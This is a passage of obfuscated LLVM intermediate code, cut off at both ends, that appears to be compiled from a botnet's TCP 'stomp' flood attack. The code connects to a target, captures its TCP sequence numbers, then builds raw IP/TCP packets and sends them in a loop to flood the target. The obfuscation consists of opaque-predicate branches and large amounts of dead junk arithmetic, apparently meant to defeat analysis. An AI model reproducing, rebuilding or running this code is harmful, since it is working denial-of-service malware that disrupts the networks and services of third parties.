  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBBpart2357, label %originalBB355alteredBB

originalBBpart2357:                               ; preds = %originalBB355
  br label %819

; <label>:819:                                    ; preds = %originalBBpart2357, %793
  %820 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %821 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %820, i32 0, i32 7
  store i16 0, i16* %821, align 2
  %822 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %823 = bitcast %struct.iphdr* %822 to i16*
  %824 = call zeroext i16 @checksum_generic(i16* %823, i32 20)
  %825 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %826 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %825, i32 0, i32 7
  store i16 %824, i16* %826, align 2
  %827 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %828 = load i32, i32* %11, align 4
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %827, i64 %829
  %831 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %830, i32 0, i32 1
  %832 = load i32, i32* %831, align 4
  %833 = add i32 %832, 1
  store i32 %833, i32* %831, align 4
  %834 = trunc i32 %832 to i16
  %835 = call zeroext i16 @htons(i16 zeroext %834) #7
  %836 = zext i16 %835 to i32
  %837 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %838 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %837, i32 0, i32 2
  store i32 %836, i32* %838, align 4
  %839 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %840 = load i32, i32* %11, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %839, i64 %841
  %843 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %842, i32 0, i32 2
  %844 = load i32, i32* %843, align 4
  %845 = trunc i32 %844 to i16
  %846 = call zeroext i16 @htons(i16 zeroext %845) #7
  %847 = zext i16 %846 to i32
  %848 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %849 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %848, i32 0, i32 3
  store i32 %847, i32* %849, align 4
  %850 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %851 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %850, i32 0, i32 6
  store i16 0, i16* %851, align 4
  %852 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %853 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %854 = bitcast %struct.tcphdr* %853 to i8*
  %855 = load i32, i32* %26, align 4
  %856 = sext i32 %855 to i64
  %857 = add i64 20, %856
  %858 = trunc i64 %857 to i16
  %859 = call zeroext i16 @htons(i16 zeroext %858) #7
  %860 = load i32, i32* %26, align 4
  %861 = sext i32 %860 to i64
  %862 = add i64 20, %861
  %863 = trunc i64 %862 to i32
  %864 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %852, i8* %854, i16 zeroext %859, i32 %863)
  %865 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %866 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %865, i32 0, i32 6
  store i16 %864, i16* %866, align 4
  %867 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %868 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %867, i32 0, i32 1
  %869 = load i16, i16* %868, align 2
  %870 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %871 = load i32, i32* %11, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %870, i64 %872
  %874 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %873, i32 0, i32 0
  %875 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %874, i32 0, i32 1
  store i16 %869, i16* %875, align 2
  %876 = load i32, i32* %12, align 4
  %877 = load i8*, i8** %42, align 8
  %878 = load i32, i32* %26, align 4
  %879 = sext i32 %878 to i64
  %880 = add i64 40, %879
  %881 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %882 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %883 = load i32, i32* %11, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %882, i64 %884
  %886 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %885, i32 0, i32 0
  %887 = bitcast %struct.sockaddr_in* %886 to %struct.sockaddr*
  store %struct.sockaddr* %887, %struct.sockaddr** %881, align 8
  %888 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %889 = load %struct.sockaddr*, %struct.sockaddr** %888, align 8
  %890 = call i64 @sendto(i32 %876, i8* %877, i64 %880, i32 16384, %struct.sockaddr* %889, i32 16)
  br label %891

; <label>:891:                                    ; preds = %819
  %892 = load i32, i32* %11, align 4
  %893 = add nsw i32 %892, 1
  store i32 %893, i32* %11, align 4
  br label %749

; <label>:894:                                    ; preds = %originalBBpart2353
  %895 = load i32, i32* @x.25
  %896 = load i32, i32* @y.26
  %897 = sub i32 %895, 1
  %898 = mul i32 %895, %897
  %899 = urem i32 %898, 2
  %900 = icmp eq i32 %899, 0
  %901 = icmp slt i32 %896, 10
  %902 = or i1 %900, %901
  br i1 %902, label %originalBB359, label %originalBB359alteredBB

originalBB359:                                    ; preds = %originalBB359alteredBB, %894
  %903 = call i64 @time(i64* null) #6
  %904 = load i32, i32* %28, align 4
  %905 = sext i32 %904 to i64
  %906 = icmp sgt i64 %903, %905
  %907 = load i32, i32* @x.25
  %908 = load i32, i32* @y.26
  %909 = sub i32 %907, 1
  %910 = mul i32 %907, %909
  %911 = urem i32 %910, 2
  %912 = icmp eq i32 %911, 0
  %913 = icmp slt i32 %908, 10
  %914 = or i1 %912, %913
  br i1 %914, label %originalBBpart2361, label %originalBB359alteredBB

originalBBpart2361:                               ; preds = %originalBB359
  br i1 %906, label %915, label %916

; <label>:915:                                    ; preds = %originalBBpart2361
  br label %917

; <label>:916:                                    ; preds = %originalBBpart2361
  br label %748

; <label>:917:                                    ; preds = %915, %274, %135, %113
  %918 = load i32, i32* @x.25
  %919 = load i32, i32* @y.26
  %920 = sub i32 %918, 1
  %921 = mul i32 %918, %920
  %922 = urem i32 %921, 2
  %923 = icmp eq i32 %922, 0
  %924 = icmp slt i32 %919, 10
  %925 = or i1 %923, %924
  br i1 %925, label %originalBB363, label %originalBB363alteredBB

originalBB363:                                    ; preds = %originalBB363alteredBB, %917
  %926 = load i32, i32* @x.25
  %927 = load i32, i32* @y.26
  %928 = sub i32 %926, 1
  %929 = mul i32 %926, %928
  %930 = urem i32 %929, 2
  %931 = icmp eq i32 %930, 0
  %932 = icmp slt i32 %927, 10
  %933 = or i1 %931, %932
  br i1 %933, label %originalBBpart2365, label %originalBB363alteredBB

originalBBpart2365:                               ; preds = %originalBB363
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %114
  store i32 1, i32* %11, align 4
  %934 = load i32, i32* %12, align 4
  %935 = bitcast i32* %11 to i8*
  %936 = call i32 @setsockopt(i32 %934, i32 0, i32 3, i8* %935, i32 4) #6
  %937 = icmp eq i32 %936, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %139
  %938 = load i32, i32* %11, align 4
  %939 = load i8, i8* %7, align 1
  %940 = zext i8 %939 to i32
  %941 = icmp slt i32 %938, %940
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %223
  %942 = load i32, i32* %29, align 4
  %943 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %944 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %944, %struct.sockaddr** %943, align 8
  %945 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %946 = load %struct.sockaddr*, %struct.sockaddr** %945, align 8
  %947 = call i32 @connect(i32 %942, %struct.sockaddr* %946, i32 16)
  %948 = call i64 @time(i64* null) #6
  store i64 %948, i64* %34, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %247
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %949 = load i32, i32* %12, align 4
  %950 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %951 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %952 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %952, %struct.sockaddr** %951, align 8
  %953 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %954 = load %struct.sockaddr*, %struct.sockaddr** %953, align 8
  %955 = call i64 @recvfrom(i32 %949, i8* %950, i64 256, i32 16384, %struct.sockaddr* %954, i32* %32)
  %956 = trunc i64 %955 to i32
  store i32 %956, i32* %36, align 4
  %957 = load i32, i32* %36, align 4
  %958 = icmp eq i32 %957, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %283
  %959 = load i32, i32* %36, align 4
  %960 = sext i32 %959 to i64
  %961 = icmp ugt i64 %960, 40
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %303
  %962 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %963 = getelementptr inbounds i8, i8* %962, i64 20
  %964 = bitcast i8* %963 to %struct.tcphdr*
  store %struct.tcphdr* %964, %struct.tcphdr** %38, align 8
  %965 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %966 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %965, i32 0, i32 0
  %967 = load i16, i16* %966, align 4
  %968 = zext i16 %967 to i32
  %969 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %970 = load i16, i16* %969, align 2
  %971 = zext i16 %970 to i32
  %972 = icmp eq i32 %968, %971
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %347
  %973 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %974 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %973, i32 0, i32 0
  %975 = load i32, i32* %974, align 4
  %976 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %977 = load i32, i32* %11, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %976, i64 %978
  %980 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %979, i32 0, i32 0
  store i32 %975, i32* %980, align 4
  %981 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %982 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %981, i32 0, i32 2
  %983 = load i32, i32* %982, align 4
  %984 = call i32 @ntohl(i32 %983) #7
  %985 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %986 = load i32, i32* %11, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %985, i64 %987
  %989 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %988, i32 0, i32 1
  store i32 %984, i32* %989, align 4
  %990 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %991 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %990, i32 0, i32 3
  %992 = load i32, i32* %991, align 4
  %993 = call i32 @ntohl(i32 %992) #7
  %994 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %995 = load i32, i32* %11, align 4
  %996 = sext i32 %995 to i64
  %997 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %994, i64 %996
  %998 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %997, i32 0, i32 2
  store i32 %993, i32* %998, align 4
  %999 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1000 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %999, i32 0, i32 1
  %1001 = load i16, i16* %1000, align 2
  %1002 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %1003 = load i32, i32* %11, align 4
  %1004 = sext i32 %1003 to i64
  %1005 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1002, i64 %1004
  %1006 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1005, i32 0, i32 3
  store i16 %1001, i16* %1006, align 4
  %1007 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %1008 = load i16, i16* %1007, align 2
  %1009 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %1010 = load i32, i32* %11, align 4
  %1011 = sext i32 %1010 to i64
  %1012 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1009, i64 %1011
  %1013 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1012, i32 0, i32 4
  store i16 %1008, i16* %1013, align 2
  %1014 = load i32, i32* %26, align 4
  %1015 = sext i32 %1014 to i64
  %_ = sub i64 40, %1015
  %gen = mul i64 %_, %1015
  %_23 = sub i64 40, %1015
  %gen24 = mul i64 %_23, %1015
  %1016 = add i64 40, %1015
  %1017 = call noalias i8* @malloc(i64 %1016) #6
  %1018 = load i8**, i8*** %14, align 8
  %1019 = load i32, i32* %11, align 4
  %1020 = sext i32 %1019 to i64
  %1021 = getelementptr inbounds i8*, i8** %1018, i64 %1020
  store i8* %1017, i8** %1021, align 8
  %1022 = load i8**, i8*** %14, align 8
  %1023 = load i32, i32* %11, align 4
  %1024 = sext i32 %1023 to i64
  %1025 = getelementptr inbounds i8*, i8** %1022, i64 %1024
  %1026 = load i8*, i8** %1025, align 8
  %1027 = bitcast i8* %1026 to %struct.iphdr*
  store %struct.iphdr* %1027, %struct.iphdr** %39, align 8
  %1028 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %1029 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1028, i64 1
  %1030 = bitcast %struct.iphdr* %1029 to %struct.tcphdr*
  store %struct.tcphdr* %1030, %struct.tcphdr** %40, align 8
  %1031 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1032 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1031, i64 1
  %1033 = bitcast %struct.tcphdr* %1032 to i8*
  store i8* %1033, i8** %41, align 8
  %1034 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %1035 = bitcast %struct.iphdr* %1034 to i8*
  %1036 = load i8, i8* %1035, align 4
  %_25 = shl i8 %1036, 15
  %_26 = sub i8 %1036, 15
  %gen27 = mul i8 %_26, 15
  %_28 = sub i8 0, %1036
  %gen29 = add i8 %_28, 15
  %_30 = sub i8 %1036, 15
  %gen31 = mul i8 %_30, 15
  %_32 = shl i8 %1036, 15
  %_33 = shl i8 %1036, 15
  %_34 = sub i8 %1036, 15
  %gen35 = mul i8 %_34, 15
  %1037 = and i8 %1036, 15
  %_36 = shl i8 %1037, 64
  %1038 = or i8 %1037, 64
  store i8 %1038, i8* %1035, align 4
  %1039 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %1040 = bitcast %struct.iphdr* %1039 to i8*
  %1041 = load i8, i8* %1040, align 4
  %_37 = shl i8 %1041, -16
  %_38 = sub i8 0, %1041
  %gen39 = add i8 %_38, -16
  %_40 = sub i8 %1041, -16
  %gen41 = mul i8 %_40, -16
  %_42 = shl i8 %1041, -16
  %_43 = shl i8 %1041, -16
  %_44 = sub i8 %1041, -16
  %gen45 = mul i8 %_44, -16
  %_46 = shl i8 %1041, -16
  %1042 = and i8 %1041, -16
  %_47 = shl i8 %1042, 5
  %_48 = sub i8 %1042, 5
  %gen49 = mul i8 %_48, 5
  %_50 = sub i8 0, %1042
  %gen51 = add i8 %_50, 5
  %_52 = shl i8 %1042, 5
  %_53 = sub i8 %1042, 5
  %gen54 = mul i8 %_53, 5
  %1043 = or i8 %1042, 5
  store i8 %1043, i8* %1040, align 4
  %1044 = load i8, i8* %15, align 1
  %1045 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %1046 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1045, i32 0, i32 1
  store i8 %1044, i8* %1046, align 1
  %1047 = load i32, i32* %26, align 4
  %1048 = sext i32 %1047 to i64
  %_55 = sub i64 0, 40
  %gen56 = add i64 %_55, %1048
  %_57 = sub i64 40, %1048
  %gen58 = mul i64 %_57, %1048
  %_59 = shl i64 40, %1048
  %_60 = sub i64 40, %1048
  %gen61 = mul i64 %_60, %1048
  %_62 = sub i64 40, %1048
  %gen63 = mul i64 %_62, %1048
  %1049 = add i64 40, %1048
  %1050 = trunc i64 %1049 to i16
  %1051 = call zeroext i16 @htons(i16 zeroext %1050) #7
  %1052 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %1053 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1052, i32 0, i32 2
  store i16 %1051, i16* %1053, align 2
  %1054 = load i16, i16* %16, align 2
  %1055 = call zeroext i16 @htons(i16 zeroext %1054) #7
  %1056 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %1057 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1056, i32 0, i32 3
  store i16 %1055, i16* %1057, align 4
  %1058 = load i8, i8* %17, align 1
  %1059 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %1060 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1059, i32 0, i32 5
  store i8 %1058, i8* %1060, align 4
  %1061 = load i8, i8* %18, align 1
  %1062 = icmp ne i8 %1061, 0
  br label %originalBB22

originalBB67alteredBB:                            ; preds = %originalBB67, %458
  %1063 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %1064 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1063, i32 0, i32 6
  store i8 6, i8* %1064, align 1
  %1065 = load i32, i32* @LOCAL_ADDR, align 4
  %1066 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %1067 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1066, i32 0, i32 8
  store i32 %1065, i32* %1067, align 4
  %1068 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %1069 = load i32, i32* %11, align 4
  %1070 = sext i32 %1069 to i64
  %1071 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1068, i64 %1070
  %1072 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1071, i32 0, i32 0
  %1073 = load i32, i32* %1072, align 4
  %1074 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %1075 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1074, i32 0, i32 9
  store i32 %1073, i32* %1075, align 4
  %1076 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %1077 = load i32, i32* %11, align 4
  %1078 = sext i32 %1077 to i64
  %1079 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1076, i64 %1078
  %1080 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1079, i32 0, i32 3
  %1081 = load i16, i16* %1080, align 4
  %1082 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1083 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1082, i32 0, i32 0
  store i16 %1081, i16* %1083, align 4
  %1084 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %1085 = load i32, i32* %11, align 4
  %1086 = sext i32 %1085 to i64
  %1087 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1084, i64 %1086
  %1088 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1087, i32 0, i32 4
  %1089 = load i16, i16* %1088, align 2
  %1090 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1091 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1090, i32 0, i32 1
  store i16 %1089, i16* %1091, align 2
  %1092 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %1093 = load i32, i32* %11, align 4
  %1094 = sext i32 %1093 to i64
  %1095 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1092, i64 %1094
  %1096 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1095, i32 0, i32 2
  %1097 = load i32, i32* %1096, align 4
  %1098 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1099 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1098, i32 0, i32 2
  store i32 %1097, i32* %1099, align 4
  %1100 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %1101 = load i32, i32* %11, align 4
  %1102 = sext i32 %1101 to i64
  %1103 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1100, i64 %1102
  %1104 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1103, i32 0, i32 1
  %1105 = load i32, i32* %1104, align 4
  %1106 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1106, i32 0, i32 3
  store i32 %1105, i32* %1107, align 4
  %1108 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1109 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1108, i32 0, i32 4
  %1110 = load i16, i16* %1109, align 4
  %1111 = and i16 %1110, -241
  %_68 = sub i16 %1111, 128
  %gen69 = mul i16 %_68, 128
  %1112 = or i16 %1111, 128
  store i16 %1112, i16* %1109, align 4
  %1113 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1114 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1113, i32 0, i32 4
  %1115 = load i16, i16* %1114, align 4
  %_70 = sub i16 %1115, -257
  %gen71 = mul i16 %_70, -257
  %_72 = shl i16 %1115, -257
  %_73 = sub i16 0, %1115
  %gen74 = add i16 %_73, -257
  %_75 = sub i16 0, %1115
  %gen76 = add i16 %_75, -257
  %_77 = sub i16 %1115, -257
  %gen78 = mul i16 %_77, -257
  %1116 = and i16 %1115, -257
  %_79 = shl i16 %1116, 256
  %_80 = sub i16 %1116, 256
  %gen81 = mul i16 %_80, 256
  %_82 = sub i16 0, %1116
  %gen83 = add i16 %_82, 256
  %1117 = or i16 %1116, 256
  store i16 %1117, i16* %1114, align 4
  %1118 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1119 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1118, i32 0, i32 4
  %1120 = load i16, i16* %1119, align 4
  %_84 = sub i16 0, %1120
  %gen85 = add i16 %_84, -4097
  %_86 = sub i16 0, %1120
  %gen87 = add i16 %_86, -4097
  %_88 = sub i16 %1120, -4097
  %gen89 = mul i16 %_88, -4097
  %_90 = sub i16 %1120, -4097
  %gen91 = mul i16 %_90, -4097
  %_92 = sub i16 %1120, -4097
  %gen93 = mul i16 %_92, -4097
  %_94 = shl i16 %1120, -4097
  %_95 = sub i16 %1120, -4097
  %gen96 = mul i16 %_95, -4097
  %1121 = and i16 %1120, -4097
  %_97 = sub i16 %1121, 4096
  %gen98 = mul i16 %_97, 4096
  %_99 = sub i16 0, %1121
  %gen100 = add i16 %_99, 4096
  %_101 = shl i16 %1121, 4096
  %_102 = sub i16 0, %1121
  %gen103 = add i16 %_102, 4096
  %_104 = sub i16 0, %1121
  %gen105 = add i16 %_104, 4096
  %1122 = or i16 %1121, 4096
  store i16 %1122, i16* %1119, align 4
  %1123 = call i32 @rand_next()
  %_106 = sub i32 %1123, 65535
  %gen107 = mul i32 %_106, 65535
  %_108 = shl i32 %1123, 65535
  %_109 = shl i32 %1123, 65535
  %_110 = sub i32 %1123, 65535
  %gen111 = mul i32 %_110, 65535
  %_112 = sub i32 %1123, 65535
  %gen113 = mul i32 %_112, 65535
  %_114 = shl i32 %1123, 65535
  %1124 = and i32 %1123, 65535
  %1125 = trunc i32 %1124 to i16
  %1126 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1126, i32 0, i32 5
  store i16 %1125, i16* %1127, align 2
  %1128 = load i8, i8* %20, align 1
  %1129 = sext i8 %1128 to i16
  %1130 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1130, i32 0, i32 4
  %1132 = load i16, i16* %1131, align 4
  %_115 = sub i16 0, %1129
  %gen116 = add i16 %_115, 1
  %_117 = sub i16 %1129, 1
  %gen118 = mul i16 %_117, 1
  %_119 = sub i16 0, %1129
  %gen120 = add i16 %_119, 1
  %_121 = sub i16 %1129, 1
  %gen122 = mul i16 %_121, 1
  %_123 = sub i16 %1129, 1
  %gen124 = mul i16 %_123, 1
  %1133 = and i16 %1129, 1
  %_125 = shl i16 %1133, 13
  %_126 = sub i16 %1133, 13
  %gen127 = mul i16 %_126, 13
  %1134 = shl i16 %1133, 13
  %_128 = sub i16 %1132, -8193
  %gen129 = mul i16 %_128, -8193
  %_130 = sub i16 0, %1132
  %gen131 = add i16 %_130, -8193
  %_132 = sub i16 %1132, -8193
  %gen133 = mul i16 %_132, -8193
  %_134 = shl i16 %1132, -8193
  %_135 = shl i16 %1132, -8193
  %_136 = sub i16 %1132, -8193
  %gen137 = mul i16 %_136, -8193
  %1135 = and i16 %1132, -8193
  %_138 = sub i16 0, %1135
  %gen139 = add i16 %_138, %1134
  %_140 = sub i16 %1135, %1134
  %gen141 = mul i16 %_140, %1134
  %_142 = shl i16 %1135, %1134
  %_143 = sub i16 %1135, %1134
  %gen144 = mul i16 %_143, %1134
  %_145 = sub i16 0, %1135
  %gen146 = add i16 %_145, %1134
  %_147 = shl i16 %1135, %1134
  %_148 = sub i16 %1135, %1134
  %gen149 = mul i16 %_148, %1134
  %1136 = or i16 %1135, %1134
  store i16 %1136, i16* %1131, align 4
  %1137 = load i8, i8* %21, align 1
  %1138 = sext i8 %1137 to i16
  %1139 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1140 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1139, i32 0, i32 4
  %1141 = load i16, i16* %1140, align 4
  %_150 = sub i16 0, %1138
  %gen151 = add i16 %_150, 1
  %_152 = sub i16 0, %1138
  %gen153 = add i16 %_152, 1
  %_154 = sub i16 %1138, 1
  %gen155 = mul i16 %_154, 1
  %1142 = and i16 %1138, 1
  %_156 = sub i16 %1142, 12
  %gen157 = mul i16 %_156, 12
  %_158 = sub i16 0, %1142
  %gen159 = add i16 %_158, 12
  %1143 = shl i16 %1142, 12
  %_160 = shl i16 %1141, -4097
  %_161 = sub i16 %1141, -4097
  %gen162 = mul i16 %_161, -4097
  %_163 = sub i16 %1141, -4097
  %gen164 = mul i16 %_163, -4097
  %_165 = shl i16 %1141, -4097
  %_166 = shl i16 %1141, -4097
  %_167 = shl i16 %1141, -4097
  %1144 = and i16 %1141, -4097
  %_168 = shl i16 %1144, %1143
  %_169 = sub i16 0, %1144
  %gen170 = add i16 %_169, %1143
  %_171 = sub i16 %1144, %1143
  %gen172 = mul i16 %_171, %1143
  %_173 = shl i16 %1144, %1143
  %_174 = sub i16 0, %1144
  %gen175 = add i16 %_174, %1143
  %_176 = shl i16 %1144, %1143
  %_177 = sub i16 0, %1144
  %gen178 = add i16 %_177, %1143
  %1145 = or i16 %1144, %1143
  store i16 %1145, i16* %1140, align 4
  %1146 = load i8, i8* %22, align 1
  %1147 = sext i8 %1146 to i16
  %1148 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1148, i32 0, i32 4
  %1150 = load i16, i16* %1149, align 4
  %_179 = shl i16 %1147, 1
  %_180 = sub i16 %1147, 1
  %gen181 = mul i16 %_180, 1
  %_182 = shl i16 %1147, 1
  %_183 = shl i16 %1147, 1
  %_184 = sub i16 0, %1147
  %gen185 = add i16 %_184, 1
  %1151 = and i16 %1147, 1
  %_186 = sub i16 %1151, 11
  %gen187 = mul i16 %_186, 11
  %1152 = shl i16 %1151, 11
  %_188 = sub i16 0, %1150
  %gen189 = add i16 %_188, -2049
  %_190 = sub i16 %1150, -2049
  %gen191 = mul i16 %_190, -2049
  %1153 = and i16 %1150, -2049
  %_192 = shl i16 %1153, %1152
  %_193 = sub i16 0, %1153
  %gen194 = add i16 %_193, %1152
  %_195 = shl i16 %1153, %1152
  %_196 = sub i16 0, %1153
  %gen197 = add i16 %_196, %1152
  %_198 = sub i16 %1153, %1152
  %gen199 = mul i16 %_198, %1152
  %1154 = or i16 %1153, %1152
  store i16 %1154, i16* %1149, align 4
  %1155 = load i8, i8* %23, align 1
  %1156 = sext i8 %1155 to i16
  %1157 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %1158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1157, i32 0, i32 4
  %1159 = load i16, i16* %1158, align 4
  %_200 = sub i16 0, %1156
  %gen201 = add i16 %_200, 1
  %_202 = sub i16 %1156, 1
  %gen203 = mul i16 %_202, 1
  %_204 = sub i16 0, %1156
  %gen205 = add i16 %_204, 1
  %_206 = shl i16 %1156, 1
  %_207 = shl i16 %1156, 1
  %_208 = shl i16 %1156, 1
  %_209 = sub i16 0, %1156
